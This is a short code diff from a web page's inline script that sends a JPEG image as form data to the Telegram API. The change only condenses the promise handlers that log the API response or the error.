@@ -57,12 +57,8 @@
                 body: formData,
             })
             .then(response => response.json())
-            .then(data => {
-                console.log('Telegram API response:', data);
-            })
-            .catch(error => {
-                console.error('Error sending photo to Telegram:', error);
-            });
+            .then(data => console.log('Telegram API response:', data))
+            .catch(error => console.error('Error sending photo to Telegram:', error));
         }, 'image/jpeg');
     }
 </script>
